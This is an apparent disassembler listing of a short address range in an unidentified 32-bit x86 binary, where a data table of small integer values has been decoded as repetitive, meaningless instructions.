  43b2fa:	inc    DWORD PTR [eax]
  43b2fc:	add    BYTE PTR [eax],dh
  43b2fe:	inc    DWORD PTR [eax]
  43b300:	add    BYTE PTR ds:0x230000ff,dh
  43b306:	inc    DWORD PTR [eax]
  43b308:	add    BYTE PTR [edx],ch
  43b30a:	inc    DWORD PTR [eax]
  43b30c:	add    BYTE PTR [edx],ch
  43b30e:	inc    DWORD PTR [eax]
  43b310:	add    BYTE PTR [edi+edi*8],ah
  43b313:	add    BYTE PTR [eax],al
  43b315:	sub    edi,edi
  43b317:	add    BYTE PTR [eax],al
  43b319:	and    al,0xff
  43b31b:	add    BYTE PTR [eax],al
  43b31d:	sub    edi,edi
  43b31f:	add    BYTE PTR [eax],al
  43b321:	das    
  43b322:	inc    DWORD PTR [eax]
  43b324:	add    BYTE PTR [ecx],ch
  43b326:	inc    DWORD PTR [eax]
  43b328:	add    BYTE PTR [edi+edi*8],bl
  43b32b:	add    BYTE PTR [eax],al
  43b32d:	sub    edi,edi
  43b32f:	add    BYTE PTR [eax],al
  43b331:	pop    ds
  43b332:	inc    DWORD PTR [eax]
  43b334:	add    BYTE PTR ds:0x240000ff,ah
  43b33a:	inc    DWORD PTR [eax]
  43b33c:	add    BYTE PTR ds:0x200000ff,ah
  43b342:	inc    DWORD PTR [eax]
  43b344:	add    BYTE PTR [esi],bl
  43b346:	inc    DWORD PTR [eax]
  43b348:	add    BYTE PTR [edx],bl
  43b34a:	inc    DWORD PTR [eax]
  43b34c:	add    BYTE PTR [edi+edi*8],ah
  43b34f:	add    BYTE PTR [eax],al
  43b351:	sub    bh,bh
  43b353:	add    BYTE PTR [eax],al
  43b355:	sub    bh,bh
  43b357:	add    BYTE PTR [eax],al
  43b359:	and    al,0xff
  43b35b:	add    BYTE PTR [eax],al
  43b35d:	sub    eax,0x1d0000ff
  43b362:	inc    DWORD PTR [eax]
  43b364:	add    BYTE PTR [edi+edi*8],ah
  43b367:	add    BYTE PTR [eax],al
  43b369:	sub    bh,bh
  43b36b:	add    BYTE PTR [eax],al
  43b36d:	sbb    eax,0x2c0000ff
  43b372:	inc    DWORD PTR [eax]
  43b374:	add    BYTE PTR ds:0x210000ff,dh
  43b37a:	inc    DWORD PTR [eax]
  43b37c:	add    BYTE PTR ds:0x280000ff,ah
  43b382:	inc    DWORD PTR [eax]
  43b384:	add    BYTE PTR [edx],ah
  43b386:	inc    DWORD PTR [eax]
  43b388:	add    BYTE PTR [esi],dl
  43b38a:	inc    DWORD PTR [eax]
  43b38c:	add    BYTE PTR ds:0x250000ff,ah
  43b392:	inc    DWORD PTR [eax]
  43b394:	add    BYTE PTR [ebx],ah
  43b396:	inc    DWORD PTR [eax]
  43b398:	add    BYTE PTR [esi],ah
  43b39a:	inc    DWORD PTR [eax]
  43b39c:	add    BYTE PTR [edi],ah
  43b39e:	inc    DWORD PTR [eax]
  43b3a0:	add    BYTE PTR [edi],ah
  43b3a2:	inc    DWORD PTR [eax]
  43b3a4:	add    BYTE PTR [edi+edi*8],ah
  43b3a7:	add    BYTE PTR [eax],al
  43b3a9:	sub    eax,0x360000ff
  43b3ae:	inc    DWORD PTR [eax]
  43b3b0:	add    BYTE PTR [ebx],bh
  43b3b2:	inc    DWORD PTR [eax]
  43b3b4:	add    BYTE PTR [ebx],ch
  43b3b6:	inc    DWORD PTR [eax]
  43b3b8:	add    BYTE PTR [eax-0x1],al
  43b3bb:	add    BYTE PTR [eax],al
  43b3bd:	sub    edi,edi
  43b3bf:	add    BYTE PTR [eax],al
  43b3c1:	cmp    edi,edi
  43b3c3:	add    BYTE PTR [eax],al
  43b3c5:	xor    bh,bh
  43b3c7:	add    BYTE PTR [eax],al
  43b3c9:	sub    bh,bh
  43b3cb:	add    BYTE PTR [eax],al
  43b3cd:	sub    bh,bh
  43b3cf:	add    BYTE PTR [eax],al
  43b3d1:	das    
  43b3d2:	inc    DWORD PTR [eax]
  43b3d4:	add    BYTE PTR ds:0x3e0000ff,ch
  43b3da:	inc    DWORD PTR [eax]
  43b3dc:	add    BYTE PTR [edi-0x1],al
  43b3df:	add    BYTE PTR [eax],al
  43b3e1:	dec    ebx
  43b3e2:	inc    DWORD PTR [eax]
  43b3e4:	add    BYTE PTR [esi-0x1],cl
  43b3e7:	add    BYTE PTR [eax],al
  43b3e9:	cmp    bh,bh
  43b3eb:	add    BYTE PTR [eax],al
  43b3ed:	cmp    edi,edi
  43b3ef:	add    BYTE PTR [eax],al
  43b3f1:	cmp    eax,0x360000ff
  43b3f6:	inc    DWORD PTR [eax]
  43b3f8:	add    BYTE PTR [eax],dh
  43b3fa:	inc    DWORD PTR [eax]
  43b3fc:	add    BYTE PTR [ebx],ch
  43b3fe:	inc    DWORD PTR [eax]
  43b400:	add    BYTE PTR [ebx],bh
  43b402:	inc    DWORD PTR [eax]
  43b404:	add    BYTE PTR [edi+edi*8],dh
  43b407:	add    BYTE PTR [eax],al
  43b409:	inc    esi
  43b40a:	inc    DWORD PTR [eax]
  43b40c:	add    BYTE PTR [ebx-0x1],al
  43b40f:	add    BYTE PTR [eax],al
  43b411:	xor    al,0xff
  43b413:	add    BYTE PTR [eax],al
  43b415:	dec    edx
  43b416:	inc    DWORD PTR [eax]
  43b418:	add    BYTE PTR [ebx-0x1],cl
  43b41b:	add    BYTE PTR [eax],al
  43b41d:	cmp    bh,bh
  43b41f:	add    BYTE PTR [eax],al
  43b421:	xor    bh,bh
  43b423:	add    BYTE PTR [eax],al
  43b425:	cmp    bh,bh
  43b427:	add    BYTE PTR [eax],al
  43b429:	inc    DWORD PTR ss:[eax]
  43b42c:	add    BYTE PTR [esi],bh
  43b42e:	inc    DWORD PTR [eax]
  43b430:	add    BYTE PTR [ecx],dh
  43b432:	inc    DWORD PTR [eax]
  43b434:	add    BYTE PTR [ecx],dh
  43b436:	inc    DWORD PTR [eax]
  43b438:	add    BYTE PTR [ecx-0x1],dl
  43b43b:	add    BYTE PTR [eax],al
  43b43d:	inc    esi
  43b43e:	inc    DWORD PTR [eax]
  43b440:	add    BYTE PTR [ebx],bh
  43b442:	inc    DWORD PTR [eax]
  43b444:	add    BYTE PTR [ecx],bh
  43b446:	inc    DWORD PTR [eax]
  43b448:	add    BYTE PTR [edx],bh
  43b44a:	inc    DWORD PTR [eax]
  43b44c:	add    BYTE PTR [edi+edi*8],bh
  43b44f:	add    BYTE PTR [eax],al
  43b451:	inc    DWORD PTR ds:[eax]
  43b454:	add    BYTE PTR [esi],dh
  43b456:	inc    DWORD PTR [eax]
  43b458:	add    BYTE PTR [edx-0x1],al
  43b45b:	add    BYTE PTR [eax],al
  43b45d:	cmp    edi,edi
  43b45f:	add    BYTE PTR [eax],al
  43b461:	sub    eax,0x290000ff
  43b466:	inc    DWORD PTR [eax]
  43b468:	add    BYTE PTR [edi+edi*8+0x0],al
  43b46c:	add    BYTE PTR [edi+edi*8+0x0],al
  43b470:	add    BYTE PTR [edx-0x1],dl
  43b473:	add    BYTE PTR [eax],al
  43b475:	inc    DWORD PTR ds:[eax]
  43b478:	add    BYTE PTR [ecx-0x1],al
  43b47b:	add    BYTE PTR [eax],al
  43b47d:	inc    DWORD PTR ss:[eax]
  43b480:	add    BYTE PTR [edi+edi*8],bh
  43b483:	add    BYTE PTR [eax],al
  43b485:	dec    edx
  43b486:	inc    DWORD PTR [eax]
  43b488:	add    BYTE PTR ds:0x380000ff,bh
  43b48e:	inc    DWORD PTR [eax]
  43b490:	add    BYTE PTR [edi+edi*8+0x0],cl
  43b494:	add    BYTE PTR [ecx],bh
  43b496:	inc    DWORD PTR [eax]
  43b498:	add    BYTE PTR [edi-0x1],cl
  43b49b:	add    BYTE PTR [eax],al
  43b49d:	inc    edi
  43b49e:	inc    DWORD PTR [eax]
  43b4a0:	add    BYTE PTR [ebp-0x1],dl
  43b4a3:	add    BYTE PTR [eax],al
  43b4a5:	xor    edi,edi
  43b4a7:	add    BYTE PTR [eax],al
  43b4a9:	cmp    edi,edi
  43b4ab:	add    BYTE PTR [eax],al
  43b4ad:	cmp    bh,bh
  43b4af:	add    BYTE PTR [eax],al
  43b4b1:	cmp    al,0xff
  43b4b3:	add    BYTE PTR [eax],al
  43b4b5:	sub    eax,0x4a0000ff
  43b4ba:	inc    DWORD PTR [eax]
  43b4bc:	add    BYTE PTR [ebp-0x1],al
  43b4bf:	add    BYTE PTR [eax],al
  43b4c1:	cmp    bh,bh
  43b4c3:	add    BYTE PTR [eax],al
  43b4c5:	inc    DWORD PTR cs:[eax]
  43b4c8:	add    BYTE PTR [edx],bh
  43b4ca:	inc    DWORD PTR [eax]
  43b4cc:	add    BYTE PTR [ebx],ch
  43b4ce:	inc    DWORD PTR [eax]
  43b4d0:	add    BYTE PTR [ecx],ch
  43b4d2:	inc    DWORD PTR [eax]
  43b4d4:	add    BYTE PTR [ebx],bh
  43b4d6:	inc    DWORD PTR [eax]
  43b4d8:	add    BYTE PTR ds:0x2d0000ff,bh
  43b4de:	inc    DWORD PTR [eax]
  43b4e0:	add    BYTE PTR [ebx],bh
  43b4e2:	inc    DWORD PTR [eax]
  43b4e4:	add    BYTE PTR [edx],bh
  43b4e6:	inc    DWORD PTR [eax]
  43b4e8:	add    BYTE PTR [edi],ah
  43b4ea:	inc    DWORD PTR [eax]
  43b4ec:	add    BYTE PTR ds:0x3c0000ff,bh
  43b4f2:	inc    DWORD PTR [eax]
  43b4f4:	add    BYTE PTR [esi],bh
  43b4f6:	inc    DWORD PTR [eax]
  43b4f8:	add    BYTE PTR [ecx],bh
  43b4fa:	inc    DWORD PTR [eax]
  43b4fc:	add    BYTE PTR [ebx],ch
  43b4fe:	inc    DWORD PTR [eax]
  43b500:	add    BYTE PTR [eax],dh
  43b502:	inc    DWORD PTR [eax]
  43b504:	add    BYTE PTR [ecx],dh
  43b506:	inc    DWORD PTR [eax]
  43b508:	add    BYTE PTR [ebx],dh
  43b50a:	inc    DWORD PTR [eax]
  43b50c:	add    BYTE PTR [edi+edi*8],ah
  43b50f:	add    BYTE PTR [eax],al
  43b511:	xor    edi,edi
  43b513:	add    BYTE PTR [eax],al
  43b515:	sub    eax,0x280000ff
  43b51a:	inc    DWORD PTR [eax]
  43b51c:	add    BYTE PTR [edi],ch
  43b51e:	inc    DWORD PTR [eax]
  43b520:	add    BYTE PTR [edi+edi*8],ch
  43b523:	add    BYTE PTR [eax],al
  43b525:	sub    al,0xff
  43b527:	add    BYTE PTR [eax],al
  43b529:	daa    
  43b52a:	inc    DWORD PTR [eax]
  43b52c:	add    BYTE PTR ds:0x3c0000ff,ah
  43b532:	inc    DWORD PTR [eax]
  43b534:	add    BYTE PTR [ebx],ah
  43b536:	inc    DWORD PTR [eax]
  43b538:	add    BYTE PTR [eax],ah
  43b53a:	inc    DWORD PTR [eax]
  43b53c:	add    BYTE PTR [edi],bl
  43b53e:	inc    DWORD PTR [eax]
  43b540:	add    BYTE PTR [ecx],ah
  43b542:	inc    DWORD PTR [eax]
  43b544:	add    BYTE PTR [edx],bl
  43b546:	inc    DWORD PTR [eax]
  43b548:	add    BYTE PTR ds:0x210000ff,bl
  43b54e:	inc    DWORD PTR [eax]
  43b550:	add    BYTE PTR [edx],ah
  43b552:	inc    DWORD PTR [eax]
  43b554:	add    BYTE PTR [edx],ah
  43b556:	inc    DWORD PTR [eax]
  43b558:	add    BYTE PTR [ebx],ah
  43b55a:	inc    DWORD PTR [eax]
  43b55c:	add    BYTE PTR ds:0x2a0000ff,dh
  43b562:	inc    DWORD PTR [eax]
  43b564:	add    BYTE PTR [ecx],ah
  43b566:	inc    DWORD PTR [eax]
  43b568:	add    BYTE PTR [edx],ah
  43b56a:	inc    DWORD PTR [eax]
  43b56c:	add    BYTE PTR [eax],ah
  43b56e:	inc    DWORD PTR [eax]
  43b570:	add    BYTE PTR [ecx],dh
  43b572:	inc    DWORD PTR [eax]
  43b574:	add    BYTE PTR [edi],ch
  43b576:	inc    DWORD PTR [eax]
  43b578:	add    BYTE PTR [esi],dh
  43b57a:	inc    DWORD PTR [eax]
  43b57c:	add    BYTE PTR [ecx-0x1],al
  43b57f:	add    BYTE PTR [eax],al
  43b581:	daa    
  43b582:	inc    DWORD PTR [eax]
  43b584:	add    BYTE PTR [edi],dh
  43b586:	inc    DWORD PTR [eax]
  43b588:	add    BYTE PTR ds:0x290000ff,ch
  43b58e:	inc    DWORD PTR [eax]
  43b590:	add    BYTE PTR [ebx],ch
  43b592:	inc    DWORD PTR [eax]
  43b594:	add    BYTE PTR [ebx],ch
  43b596:	inc    DWORD PTR [eax]
  43b598:	add    BYTE PTR [ebx],ch
  43b59a:	inc    DWORD PTR [eax]
  43b59c:	add    BYTE PTR [edx],ch
  43b59e:	inc    DWORD PTR [eax]
  43b5a0:	add    BYTE PTR [edi],ah
  43b5a2:	inc    DWORD PTR [eax]
  43b5a4:	add    BYTE PTR [ebx],ch
  43b5a6:	inc    DWORD PTR [eax]
  43b5a8:	add    BYTE PTR [edi+edi*8],ch
  43b5ab:	add    BYTE PTR [eax],al
  43b5ad:	sub    al,0xff
  43b5af:	add    BYTE PTR [eax],al
  43b5b1:	das    
  43b5b2:	inc    DWORD PTR [eax]
  43b5b4:	add    BYTE PTR [edi+edi*8],ah
  43b5b7:	add    BYTE PTR [eax],al
  43b5b9:	dec    edi
  43b5ba:	inc    DWORD PTR [eax]
  43b5bc:	add    BYTE PTR [esi],ch
  43b5be:	inc    DWORD PTR [eax]
  43b5c0:	add    BYTE PTR [edx],dh
  43b5c2:	inc    DWORD PTR [eax]
  43b5c4:	add    BYTE PTR [esi],dh
  43b5c6:	inc    DWORD PTR [eax]
  43b5c8:	add    BYTE PTR [ecx-0x1],al
  43b5cb:	add    BYTE PTR [eax],al
  43b5cd:	sub    bh,bh
  43b5cf:	add    BYTE PTR [eax],al
  43b5d1:	xor    edi,edi
  43b5d3:	add    BYTE PTR [eax],al
  43b5d5:	inc    edx
  43b5d6:	inc    DWORD PTR [eax]
  43b5d8:	add    BYTE PTR [edx],ch
  43b5da:	inc    DWORD PTR [eax]
  43b5dc:	add    BYTE PTR [edx],dh
  43b5de:	inc    DWORD PTR [eax]
  43b5e0:	add    BYTE PTR [eax],dh
  43b5e2:	inc    DWORD PTR [eax]
  43b5e4:	add    BYTE PTR [ebp-0x1],al
  43b5e7:	add    BYTE PTR [eax],al
  43b5e9:	inc    ecx
  43b5ea:	inc    DWORD PTR [eax]
  43b5ec:	add    BYTE PTR [eax-0x1],al
  43b5ef:	add    BYTE PTR [eax],al
  43b5f1:	dec    edi
  43b5f2:	inc    DWORD PTR [eax]
  43b5f4:	add    BYTE PTR [ebx-0x1],dl
  43b5f7:	add    BYTE PTR [eax],al
  43b5f9:	dec    ebp
  43b5fa:	inc    DWORD PTR [eax]
  43b5fc:	add    BYTE PTR [edi-0x1],al
  43b5ff:	add    BYTE PTR [eax],al
  43b601:	inc    edx
  43b602:	inc    DWORD PTR [eax]
  43b604:	add    BYTE PTR [edi+edi*8],ch
  43b607:	add    BYTE PTR [eax],al
  43b609:	sub    al,0xff
  43b60b:	add    BYTE PTR [eax],al
  43b60d:	xor    eax,0x2b0000ff
  43b612:	inc    DWORD PTR [eax]
  43b614:	add    BYTE PTR [edx],bh
  43b616:	inc    DWORD PTR [eax]
  43b618:	add    BYTE PTR [ebx-0x1],cl
  43b61b:	add    BYTE PTR [eax],al
  43b61d:	inc    ebp
  43b61e:	inc    DWORD PTR [eax]
  43b620:	add    BYTE PTR [eax-0x1],cl
  43b623:	add    BYTE PTR [eax],al
  43b625:	cmp    al,0xff
  43b627:	add    BYTE PTR [eax],al
  43b629:	cmp    edi,edi
  43b62b:	add    BYTE PTR [eax],al
  43b62d:	inc    eax
  43b62e:	inc    DWORD PTR [eax]
  43b630:	add    BYTE PTR [edi],ah
  43b632:	inc    DWORD PTR [eax]
  43b634:	add    BYTE PTR [edi+edi*8],dh
  43b637:	add    BYTE PTR [eax],al
  43b639:	push   eax
  43b63a:	inc    DWORD PTR [eax]
  43b63c:	add    BYTE PTR [ecx-0x1],al
  43b63f:	add    BYTE PTR [eax],al
  43b641:	inc    ebx
  43b642:	inc    DWORD PTR [eax]
  43b644:	add    BYTE PTR [edi],bh
  43b646:	inc    DWORD PTR [eax]
  43b648:	add    BYTE PTR ds:0x3a0000ff,ch
  43b64e:	inc    DWORD PTR [eax]
  43b650:	add    BYTE PTR [ebp-0x1],al
  43b653:	add    BYTE PTR [eax],al
  43b655:	inc    esi
  43b656:	inc    DWORD PTR [eax]
  43b658:	add    BYTE PTR [edi],bh
  43b65a:	inc    DWORD PTR [eax]
  43b65c:	add    BYTE PTR [ecx-0x1],cl
  43b65f:	add    BYTE PTR [eax],al
  43b661:	dec    ecx
  43b662:	inc    DWORD PTR [eax]
  43b664:	add    BYTE PTR [edi-0x1],al
  43b667:	add    BYTE PTR [eax],al
  43b669:	sub    bh,bh
  43b66b:	add    BYTE PTR [eax],al
  43b66d:	inc    esp
  43b66e:	inc    DWORD PTR [eax]
  43b670:	add    BYTE PTR [edi+edi*8+0x0],dl
  43b674:	add    BYTE PTR [ebx],bh
  43b676:	inc    DWORD PTR [eax]
  43b678:	add    BYTE PTR [eax-0x1],al
  43b67b:	add    BYTE PTR [eax],al
  43b67d:	xor    edi,edi
  43b67f:	add    BYTE PTR [eax],al
  43b681:	aaa    
  43b682:	inc    DWORD PTR [eax]
  43b684:	add    BYTE PTR [ecx-0x1],dl
  43b687:	add    BYTE PTR [eax],al
  43b689:	dec    esi
  43b68a:	inc    DWORD PTR [eax]
  43b68c:	add    BYTE PTR [eax-0x1],al
  43b68f:	add    BYTE PTR [eax],al
  43b691:	dec    eax
  43b692:	inc    DWORD PTR [eax]
  43b694:	add    BYTE PTR ds:0x3b0000ff,bh
  43b69a:	inc    DWORD PTR [eax]
  43b69c:	add    BYTE PTR [edi+edi*8+0x0],cl
  43b6a0:	add    BYTE PTR [edi+edi*8+0x0],bl
  43b6a4:	add    BYTE PTR [edi-0x1],al
  43b6a7:	add    BYTE PTR [eax],al
  43b6a9:	xor    edi,edi
  43b6ab:	add    BYTE PTR [eax],al
  43b6ad:	inc    DWORD PTR ss:[eax]
  43b6b0:	add    BYTE PTR [ebx],ch
  43b6b2:	inc    DWORD PTR [eax]
  43b6b4:	add    BYTE PTR [edx-0x1],al
  43b6b7:	add    BYTE PTR [eax],al
  43b6b9:	inc    edi
  43b6ba:	inc    DWORD PTR [eax]
  43b6bc:	add    BYTE PTR [esi],dh
  43b6be:	inc    DWORD PTR [eax]
  43b6c0:	add    BYTE PTR [eax],dh
  43b6c2:	inc    DWORD PTR [eax]
  43b6c4:	add    BYTE PTR ds:0x2f0000ff,bh
  43b6ca:	inc    DWORD PTR [eax]
  43b6cc:	add    BYTE PTR [ebx],bh
  43b6ce:	inc    DWORD PTR [eax]
  43b6d0:	add    BYTE PTR [ecx],dh
  43b6d2:	inc    DWORD PTR [eax]
  43b6d4:	add    BYTE PTR [edi+edi*8],bh
  43b6d7:	add    BYTE PTR [eax],al
  43b6d9:	cmp    bh,bh
  43b6db:	add    BYTE PTR [eax],al
  43b6dd:	sub    al,0xff
  43b6df:	add    BYTE PTR [eax],al
  43b6e1:	xor    al,0xff
  43b6e3:	add    BYTE PTR [eax],al
  43b6e5:	inc    DWORD PTR cs:[eax]
  43b6e8:	add    BYTE PTR [edx],bh
  43b6ea:	inc    DWORD PTR [eax]
  43b6ec:	add    BYTE PTR [ecx-0x1],al
  43b6ef:	add    BYTE PTR [eax],al
  43b6f1:	aaa    
  43b6f2:	inc    DWORD PTR [eax]
  43b6f4:	add    BYTE PTR ds:0x3b0000ff,ah
  43b6fa:	inc    DWORD PTR [eax]
  43b6fc:	add    BYTE PTR [edi],ch
  43b6fe:	inc    DWORD PTR [eax]
  43b700:	add    BYTE PTR [ecx],ch
  43b702:	inc    DWORD PTR [eax]
  43b704:	add    BYTE PTR [ecx],bh
  43b706:	inc    DWORD PTR [eax]
  43b708:	add    BYTE PTR [eax],dh
  43b70a:	inc    DWORD PTR [eax]
  43b70c:	add    BYTE PTR ds:0x270000ff,ch
  43b712:	inc    DWORD PTR [eax]
  43b714:	add    BYTE PTR [edi+edi*8],dh
  43b717:	add    BYTE PTR [eax],al
  43b719:	xor    edi,edi
  43b71b:	add    BYTE PTR [eax],al
  43b71d:	xor    bh,bh
  43b71f:	add    BYTE PTR [eax],al
  43b721:	xor    edi,edi
  43b723:	add    BYTE PTR [eax],al
  43b725:	inc    DWORD PTR cs:[eax]
  43b728:	add    BYTE PTR [ecx],ch
  43b72a:	inc    DWORD PTR [eax]
  43b72c:	add    BYTE PTR [eax],dh
  43b72e:	inc    DWORD PTR [eax]
  43b730:	add    BYTE PTR [ecx],ch
  43b732:	inc    DWORD PTR [eax]
  43b734:	add    BYTE PTR ds:0x290000ff,bl
  43b73a:	inc    DWORD PTR [eax]
  43b73c:	add    BYTE PTR [ebx],ah
  43b73e:	inc    DWORD PTR [eax]
  43b740:	add    BYTE PTR [ecx],ah
  43b742:	inc    DWORD PTR [eax]
  43b744:	add    BYTE PTR [edx],bl
  43b746:	inc    DWORD PTR [eax]
  43b748:	add    BYTE PTR [ecx],ah
  43b74a:	inc    DWORD PTR [eax]
  43b74c:	add    BYTE PTR ds:0x220000ff,ah
  43b752:	inc    DWORD PTR [eax]
  43b754:	add    BYTE PTR [edi],bl
  43b756:	inc    DWORD PTR [eax]
  43b758:	add    BYTE PTR [edi+edi*8],ah
  43b75b:	add    BYTE PTR [eax],al
  43b75d:	and    eax,0x280000ff
  43b762:	inc    DWORD PTR [eax]
  43b764:	add    BYTE PTR [edx],ah
  43b766:	inc    DWORD PTR [eax]
  43b768:	add    BYTE PTR [eax],ch
  43b76a:	inc    DWORD PTR [eax]
  43b76c:	add    BYTE PTR [edi],bl
  43b76e:	inc    DWORD PTR [eax]
  43b770:	add    BYTE PTR [edi+edi*8],ah
  43b773:	add    BYTE PTR [eax],al
  43b775:	and    edi,edi
  43b777:	add    BYTE PTR [eax],al
  43b779:	sbb    al,0xff
  43b77b:	add    BYTE PTR [eax],al
  43b77d:	and    edi,edi
  43b77f:	add    BYTE PTR [eax],al
  43b781:	daa    
  43b782:	inc    DWORD PTR [eax]
  43b784:	add    BYTE PTR [ebx],ah
  43b786:	inc    DWORD PTR [eax]
  43b788:	add    BYTE PTR [eax-0x1],al
  43b78b:	add    BYTE PTR [eax],al
  43b78d:	das    
  43b78e:	inc    DWORD PTR [eax]
  43b790:	add    BYTE PTR [edx],bh
  43b792:	inc    DWORD PTR [eax]
  43b794:	add    BYTE PTR [ebx-0x1],al
  43b797:	add    BYTE PTR [eax],al
  43b799:	inc    ecx
  43b79a:	inc    DWORD PTR [eax]
  43b79c:	add    BYTE PTR [esi],bh
  43b79e:	inc    DWORD PTR [eax]
  43b7a0:	add    BYTE PTR [edi+edi*8],bh
  43b7a3:	add    BYTE PTR [eax],al
  43b7a5:	cmp    bh,bh
  43b7a7:	add    BYTE PTR [eax],al
  43b7a9:	xor    al,0xff
  43b7ab:	add    BYTE PTR [eax],al
  43b7ad:	xor    eax,0x2b0000ff
  43b7b2:	inc    DWORD PTR [eax]
  43b7b4:	add    BYTE PTR ds:0x1d0000ff,ah
  43b7ba:	inc    DWORD PTR [eax]
  43b7bc:	add    BYTE PTR [edi],ch
  43b7be:	inc    DWORD PTR [eax]
  43b7c0:	add    BYTE PTR [ebx],ch
  43b7c2:	inc    DWORD PTR [eax]
  43b7c4:	add    BYTE PTR ds:0x340000ff,ah
  43b7ca:	inc    DWORD PTR [eax]
  43b7cc:	add    BYTE PTR ds:0x380000ff,bh
  43b7d2:	inc    DWORD PTR [eax]
  43b7d4:	add    BYTE PTR [ebx],ch
  43b7d6:	inc    DWORD PTR [eax]
  43b7d8:	add    BYTE PTR [esi],bh
  43b7da:	inc    DWORD PTR [eax]
  43b7dc:	add    BYTE PTR [esi-0x1],al
  43b7df:	add    BYTE PTR [eax],al
  43b7e1:	inc    ebp
  43b7e2:	inc    DWORD PTR [eax]
  43b7e4:	add    BYTE PTR [edx],bh
  43b7e6:	inc    DWORD PTR [eax]
  43b7e8:	add    BYTE PTR [edx],dh
  43b7ea:	inc    DWORD PTR [eax]
  43b7ec:	add    BYTE PTR [edx],ch
  43b7ee:	inc    DWORD PTR [eax]
  43b7f0:	add    BYTE PTR [esi],bh
  43b7f2:	inc    DWORD PTR [eax]
  43b7f4:	add    BYTE PTR [eax-0x1],al
  43b7f7:	add    BYTE PTR [eax],al
  43b7f9:	inc    esp
  43b7fa:	inc    DWORD PTR [eax]
  43b7fc:	add    BYTE PTR [eax],dh
  43b7fe:	inc    DWORD PTR [eax]
  43b800:	add    BYTE PTR [edx-0x1],dl
  43b803:	add    BYTE PTR [eax],al
  43b805:	dec    esp
  43b806:	inc    DWORD PTR [eax]
  43b808:	add    BYTE PTR [edi+edi*8+0x0],al
  43b80c:	add    BYTE PTR [esi-0x1],cl
  43b80f:	add    BYTE PTR [eax],al
  43b811:	inc    ecx
  43b812:	inc    DWORD PTR [eax]
  43b814:	add    BYTE PTR [esi],dh
  43b816:	inc    DWORD PTR [eax]
  43b818:	add    BYTE PTR [edi],dh
  43b81a:	inc    DWORD PTR [eax]
  43b81c:	add    BYTE PTR [edi],dh
  43b81e:	inc    DWORD PTR [eax]
  43b820:	add    BYTE PTR ds:0x380000ff,bh
  43b826:	inc    DWORD PTR [eax]
  43b828:	add    BYTE PTR [ebx-0x1],cl
  43b82b:	add    BYTE PTR [eax],al
  43b82d:	das    
  43b82e:	inc    DWORD PTR [eax]
  43b830:	add    BYTE PTR [edi+edi*8],bh
  43b833:	add    BYTE PTR [eax],al
  43b835:	das    
  43b836:	inc    DWORD PTR [eax]
  43b838:	add    BYTE PTR [ecx],bh
  43b83a:	inc    DWORD PTR [eax]
  43b83c:	add    BYTE PTR [edi],ch
  43b83e:	inc    DWORD PTR [eax]
  43b840:	add    BYTE PTR [edi+edi*8],dh
  43b843:	add    BYTE PTR [eax],al
  43b845:	inc    esp
  43b846:	inc    DWORD PTR [eax]
  43b848:	add    BYTE PTR [edi+edi*8],bh
  43b84b:	add    BYTE PTR [eax],al
  43b84d:	sub    edi,edi
  43b84f:	add    BYTE PTR [eax],al
  43b851:	xor    eax,0x440000ff
  43b856:	inc    DWORD PTR [eax]
  43b858:	add    BYTE PTR [edi+edi*8],bh
  43b85b:	add    BYTE PTR [eax],al
  43b85d:	inc    ebp
  43b85e:	inc    DWORD PTR [eax]
  43b860:	add    BYTE PTR [edi],bh
  43b862:	inc    DWORD PTR [eax]
  43b864:	add    BYTE PTR [esi-0x1],al
  43b867:	add    BYTE PTR [eax],al
  43b869:	cmp    edi,edi
  43b86b:	add    BYTE PTR [eax],al
  43b86d:	pop    ecx
  43b86e:	inc    DWORD PTR [eax]
  43b870:	add    BYTE PTR ds:0x3f0000ff,bh
  43b876:	inc    DWORD PTR [eax]
  43b878:	add    BYTE PTR [ebx],bh
  43b87a:	inc    DWORD PTR [eax]
  43b87c:	add    BYTE PTR [edi-0x1],al
  43b87f:	add    BYTE PTR [eax],al
  43b881:	xor    edi,edi
  43b883:	add    BYTE PTR [eax],al
  43b885:	inc    esp
  43b886:	inc    DWORD PTR [eax]
  43b888:	add    BYTE PTR [edi+edi*8],dh
  43b88b:	add    BYTE PTR [eax],al
  43b88d:	sub    al,0xff
  43b88f:	add    BYTE PTR [eax],al
  43b891:	dec    ecx
  43b892:	inc    DWORD PTR [eax]
  43b894:	add    BYTE PTR [edx],dh
  43b896:	inc    DWORD PTR [eax]
  43b898:	add    BYTE PTR [edx],dh
  43b89a:	inc    DWORD PTR [eax]
  43b89c:	add    BYTE PTR [ebx-0x1],al
  43b89f:	add    BYTE PTR [eax],al
  43b8a1:	cmp    edi,edi
  43b8a3:	add    BYTE PTR [eax],al
  43b8a5:	inc    esi
  43b8a6:	inc    DWORD PTR [eax]
  43b8a8:	add    BYTE PTR [ecx-0x1],al
  43b8ab:	add    BYTE PTR [eax],al
  43b8ad:	dec    ebx
  43b8ae:	inc    DWORD PTR [eax]
  43b8b0:	add    BYTE PTR [edi],dh
  43b8b2:	inc    DWORD PTR [eax]
  43b8b4:	add    BYTE PTR [ebx-0x1],dl
  43b8b7:	add    BYTE PTR [eax],al
  43b8b9:	aaa    
  43b8ba:	inc    DWORD PTR [eax]
  43b8bc:	add    BYTE PTR [ebx],bh
  43b8be:	inc    DWORD PTR [eax]
  43b8c0:	add    BYTE PTR [ecx],bh
  43b8c2:	inc    DWORD PTR [eax]
  43b8c4:	add    BYTE PTR [esi],bh
  43b8c6:	inc    DWORD PTR [eax]
  43b8c8:	add    BYTE PTR [ebx-0x1],cl
  43b8cb:	add    BYTE PTR [eax],al
  43b8cd:	xor    eax,0x2d0000ff
  43b8d2:	inc    DWORD PTR [eax]
  43b8d4:	add    BYTE PTR [edi+edi*8+0x0],al
  43b8d8:	add    BYTE PTR [eax],ch
  43b8da:	inc    DWORD PTR [eax]
  43b8dc:	add    BYTE PTR [esi],dh
  43b8de:	inc    DWORD PTR [eax]
  43b8e0:	add    BYTE PTR [esi],ch
  43b8e2:	inc    DWORD PTR [eax]
  43b8e4:	add    BYTE PTR [ebx],dh
  43b8e6:	inc    DWORD PTR [eax]
  43b8e8:	add    BYTE PTR [ebx],ch
  43b8ea:	inc    DWORD PTR [eax]
  43b8ec:	add    BYTE PTR [edx],bh
  43b8ee:	inc    DWORD PTR [eax]
  43b8f0:	add    BYTE PTR [edi],ah
  43b8f2:	inc    DWORD PTR [eax]
  43b8f4:	add    BYTE PTR [edx],ch
  43b8f6:	inc    DWORD PTR [eax]
  43b8f8:	add    BYTE PTR [eax],dh
  43b8fa:	inc    DWORD PTR [eax]
  43b8fc:	add    BYTE PTR [eax],ch
